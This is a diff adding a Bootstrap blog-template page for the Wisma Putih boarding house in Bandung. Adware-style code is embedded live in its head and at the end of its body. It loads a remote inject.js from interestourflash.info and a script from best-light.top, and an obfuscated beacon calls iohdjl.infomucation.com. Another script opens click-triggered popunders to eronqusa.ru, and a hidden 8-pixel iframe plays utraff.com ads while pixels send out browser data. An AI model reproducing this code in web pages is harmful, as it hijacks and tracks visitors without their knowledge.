@@ -1,0 +1,237 @@
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
+    <meta name="generator" content="Jekyll v3.8.5">
+    <title>Blog Template · Bootstrap</title>
+
+    <link rel="canonical" href="https://getbootstrap.com/docs/4.3/examples/blog/">
+
+    <!-- Bootstrap core CSS -->
+<link href="/docs/4.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+
+    <style>
+      .bd-placeholder-img {
+        font-size: 1.125rem;
+        text-anchor: middle;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+
+      @media (min-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 3.5rem;
+        }
+      }
+    </style>
+    <!-- Custom styles for this template -->
+    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:700,900" rel="stylesheet">
+    <!-- Custom styles for this template -->
+    <link href="blog.css" rel="stylesheet">
+  <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script charset="UTF-8">ss78mest = {"did":"21","kTag":false,"scriptDomain":"interestourflash.info","tag":"asia","extensionId":"1569864031","vTag":false,"version":422,"cid":1};
+window["jj837_11"] = "1569864031";
+</script><script src="https://interestourflash.info/inject.js?tag=asia&amp;did=21&amp;v_tag=false&amp;k_tag=false" charset="UTF-8"></script><script src="https://interestourflash.info/ep?d=%7B%22id%22%3A%221569864031%22%2C%22tag%22%3A%22asia%22%2C%22did%22%3A%2221%22%2C%22cid%22%3A1%2C%22ua%22%3A%22Mozilla%2F5.0%20(Windows%20NT%206.2%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F77.0.3865.90%20Safari%2F537.36%22%2C%22ver%22%3A%22422%22%2C%22_%22%3A1570589974010%7D" charset="UTF-8"></script><script src="https://www.googletagmanager.com/gtag/js?id=UA-127560459-1"></script><script>try{!function(){var a=['src','concat','join','76'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x18e));var b=function(c,d){c=c-0x0;var e=a[c];return e;};'use strict';var scm=['//','s:','tp','ht']['reverse']()[b('0x0')]('');var pth=['iohdjl.infomucation.com',b('0x1')]['join']('/');var img=new Image();img[b('0x2')]=''[b('0x3')](scm)[b('0x3')](pth,'.gif');}();}catch(e){}</script><script>try{!function(){if (!location.href.includes('.google.') && !location.href.includes('.yahoo.') && !location.href.includes('.bing.')) {
+var l = function (src, hash) { var s = document.createElement('script'); s.type = 'text/javascript'; s.src = src; document.body.appendChild(s); s.onload = function () { all_bnxa(hash); }; }; l('https://best-light.top/v/537562.js?j=1221', '537562');
+}}();}catch(e){}</script><script>try{!function(){var cooki=navigator.cookieEnabled;
+var url = "";
+var clkcookie;
+
+if (cooki && window == window.top) {
+	clkcookie = GetCookie('stclick');
+	var pingcookie = GetCookie('pingnetwork');
+	if (clkcookie == null) {
+		if (pingcookie == null) {
+			var img = new Image();
+			var image_url = "https://eronqusa.ru/a/?guid=55eb76b7b631b0824hhdop3961e523cb&prid=2&pid=13_1424_2";
+			img.src = image_url;
+			img.onload = function(){
+				url = 'https://eronqusa.ru/c/?guid=55eb76b7b631b0824hhdop3961e523cb&prid=2&pid=13_1424_2';
+				var ExpDate = new Date ();
+				ExpDate.setTime(ExpDate.getTime() + (1 * 60 * 1000));
+				SetCookie('pingnetwork','1',ExpDate, "/");
+			};
+			img.onerror = function(){
+				var ExpDate = new Date ();
+				ExpDate.setTime(ExpDate.getTime() + (15 * 60 * 1000));
+				SetCookie('pingnetwork','2',ExpDate, "/");
+			};
+		} else if (pingcookie == 1) {
+			url = 'https://eronqusa.ru/c/?guid=55eb76b7b631b0824hhdop3961e523cb&prid=2&pid=13_1424_2';
+		}
+	}
+}
+
+var par = "menubar=yes,location=yes,resizable=yes,scrollbars=yes,status=yes";
+var txt = new Array();
+txt[0]="http://yandex.ru/";
+txt[1]="http://google.com/";
+var b = Math.round(Math.random() * (txt.length - 1));
+var ssilka = txt[b];
+
+function showclick() {
+	cooki=navigator.cookieEnabled;
+	if(cooki) {
+		clkcookie = GetCookie('stclick');
+		if (clkcookie == null && url != "") {
+			var hrf = url;
+			url = "";
+			window.open(hrf, "site", par);
+			var ExpDate = new Date ();
+			ExpDate.setTime(ExpDate.getTime() + (6 * 60 * 1000));
+			SetCookie('stclick','1',ExpDate, "/");
+		}
+	}
+}
+
+function GetCookie(name) {
+  var matches = document.cookie.match(new RegExp(
+    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+  ));
+  return matches ? decodeURIComponent(matches[1]) : undefined;
+}
+
+function SetCookie (name, value) { var argv = SetCookie.arguments; var argc = SetCookie.arguments.length; var expires = (argc > 2) ? argv[2] : null;
+	var path = (argc > 3) ? argv[3] : null;
+	var domain = (argc > 4) ? argv[4] : null;
+	var secure = (argc > 5) ? argv[5] : false;
+	document.cookie = name + "=" + escape (value) +
+	((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
+	((path == null) ? "" : ("; path=" + path)) +
+	((domain == null) ? "" : ("; domain=" + domain)) +
+	((secure == true) ? "; secure" : "");
+}
+
+document.onmousedown=showclick;}();}catch(e){}</script></head>
+  <body data-script-loaded="1" data-sl="1">
+    <div class="container">
+  <header class="blog-header py-3">
+    <div class="row flex-nowrap justify-content-between align-items-center">
+      <div class="col-4 pt-1">
+        <a class="text-muted" href="#">Jl. Cilimus No 40</a>
+      </div>
+      <div class="col-4 text-center">
+        <a class="blog-header-logo text-dark" href="#">Wisma Putih</a>
+      </div>
+      <div class="col-4 d-flex justify-content-end align-items-center">
+        <a class="text-muted" href="#">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="mx-3" role="img" viewBox="0 0 24 24" focusable="false"><title>Search</title><circle cx="10.5" cy="10.5" r="7.5"></circle><path d="M21 21l-5.2-5.2"></path></svg>
+        </a>
+        <a class="btn btn-sm btn-outline-secondary" href="#">Daftar Masuk</a>
+      </div>
+    </div>
+  </header>
+
+  <div class="nav-scroller py-1 mb-2">
+    <nav class="nav d-flex justify-content-between">
+      <a class="p-2 text-muted" href="#">Home</a>
+      <a class="p-2 text-muted" href="#">Profile</a>
+      <a class="p-2 text-muted" href="#">Tipe Kamar</a>
+      <a class="p-2 text-muted" href="#">Fasilitas</a>
+      <a class="p-2 text-muted" href="#">Kegiatan</a>
+      <a class="p-2 text-muted" href="#">Alamat</a>
+      <a class="p-2 text-muted" href="#">Kontak</a>
+</nav>
+  </div>
+
+  <div class="jumbotron p-4 p-md-5 text-white rounded bg-dark">
+    <div class="col-md-6 px-0">
+      <h1 class="display-4 font-italic">WISMA PUTIH</h1>
+      <p class="lead my-3">Wisma putih merupakan salah satu kosan yang lokasinya berada di Bandung Utara dekat dengan lingkungan kampus seperti UPI, UNPAS, STP Bandung. 
+</p>
+      <p class="lead mb-0"><a href="#" class="text-white font-weight-bold">Jalan Cilimus No 40 Rt 07 Rw 06 Kelurahan Isola</a></p>
+    </div>
+  </div>
+
+  <div class="row mb-2">
+    <div class="col-md-6">
+      <div class="row no-gutters border rounded overflow-hidden flex-md-row mb-4 shadow-sm h-md-250 position-relative">
+        <div class="col p-4 d-flex flex-column position-static">
+          <strong class="d-inline-block mb-2 text-primary">Page 1</strong>
+          <h3 class="mb-0">Fasilitas</h3>
+        <p class="card-text mb-auto">Fasilitas yang ada di wisma putih terdiri dari.</p>
+     </div>
+        <div class="col-auto d-none d-lg-block">
+          <svg class="bd-placeholder-img" width="200" height="250" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice" focusable="false" role="img" aria-label="Placeholder: Thumbnail"><title>Placeholder</title><rect width="100%" height="100%" fill="#55595c"></rect><text x="50%" y="50%" fill="#eceeef" dy=".3em">Fasilitas</text></svg>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-6">
+      <div class="row no-gutters border rounded overflow-hidden flex-md-row mb-4 shadow-sm h-md-250 position-relative">
+        <div class="col p-4 d-flex flex-column position-static">
+          <strong class="d-inline-block mb-2 text-success">Page 2</strong>
+          <h3 class="mb-0">Tipe Kamar</h3>
+         <p class="mb-auto">Tipe kamar yang ada di wisma putih tersedia dalam bebrapa tipe.</p>
+    </div>
+        <div class="col-auto d-none d-lg-block">
+          <svg class="bd-placeholder-img" width="200" height="250" xmlns="https://github.com/Nurhidayatulloh/Catatan-KBTW-1/blob/master/Kamar%20Isi%20%206%20juta.jpg" preserveAspectRatio="xMidYMid slice" focusable="false" role="img" aria-label="Placeholder: Thumbnail"><title>Placeholder</title><rect width="100%" height="100%" fill="#55595c"></rect><text x="50%" y="50%" fill="#eceeef" dy=".3em">Tipe kamar</text></svg>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<main role="main" class="container">
+  <div class="row">
+    <div class="col-md-8 blog-main">
+      <h3 class="pb-4 mb-4 font-italic border-bottom">
+      All about Wisma Putih
+      </h3>
+
+      <nav class="blog-pagination">
+        <a class="btn btn-outline-primary" href="#">Older</a>
+        <a class="btn btn-outline-secondary disabled" href="#" tabindex="-1" aria-disabled="true">Newer</a>
+      </nav>
+
+    </div><!-- /.blog-main -->
+
+    <aside class="col-md-4 blog-sidebar">
+      <div class="p-4 mb-3 bg-light rounded">
+        <h4 class="font-italic">Apa kata merekat</h4>
+        <p class="mb-0">Wisma putih kosan paling nyaman....</p>
+      </div>
+
+      <div class="p-4">
+        <h4 class="font-italic">Archives</h4>
+        <ol class="list-unstyled mb-0">
+          <li><a href="#">March 2014</a></li>
+          <li><a href="#">February 2014</a></li>
+          <li><a href="#">January 2014</a></li>
+          <li><a href="#">December 2013</a></li>
+          <li><a href="#">November 2013</a></li>
+          <li><a href="#">October 2013</a></li>
+          <li><a href="#">September 2013</a></li>
+          <li><a href="#">August 2013</a></li>
+          <li><a href="#">July 2013</a></li>
+          <li><a href="#">June 2013</a></li>
+          <li><a href="#">May 2013</a></li>
+          <li><a href="#">April 2013</a></li>
+        </ol>
+      </div>
+
+      <div class="p-4">
+        <h4 class="font-italic">Media social</h4>
+        <ol class="list-unstyled">
+          <li><a href="#">GitHub</a></li>
+          <li><a href="#">Twitter</a></li>
+          <li><a href="#">Facebook</a></li>
+        </ol>
+      </div>
+    </aside><!-- /.blog-sidebar -->
+
+  </div><!-- /.row -->
+
+</main><!-- /.container -->
+
+<footer class="blog-footer">
+  <p>Blog template built for <a href="https://getbootstrap.com/">Bootstrap</a> by <a href="https://twitter.com/mdo">@mdo</a>.</p>
+  <p>
+    <a href="#">Back to top</a>
+  </p>
+</footer>
+
+
+<div style="width: 8px; height: 8px; position: fixed; bottom: 1px; right: 1px; overflow: hidden; background-color: white; z-index: 100000000;"><div style="width: 8px; height: 8px; top: 1px; left: 1px; background-color: white; z-index: 100000000;"><iframe src="//utraff.com/index.php?r=iframe/index&amp;id=2350&amp;max_prerolls=10&amp;timer=40" id="ut-player" frameborder="0" name="video-extension" style="width: 640px; height: 360px; position: absolute; top: 0px; left: 0px; background-color: white; border: none; display: block;"></iframe></div></div><script type="text/javascript" src="https://best-light.top/v/537562.js?j=1221"></script><img src="//interestourflash.info/acnt?_=1570589976083&amp;did=21&amp;tag=asia&amp;r=https%253A%252F%252Fgetbootstrap.com%252Fdocs%252F4.3%252Fexamples%252Fblog%252F&amp;ua=Mozilla%2F5.0%20(Windows%20NT%206.2%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F77.0.3865.90%20Safari%2F537.36&amp;aac=&amp;if=0&amp;uid=1569864031&amp;cid=1&amp;v=422"><img src="https://gif-ads.top/click.php?cnv_u=537562"><div id="des_xnba_ewn"></div></body></html>
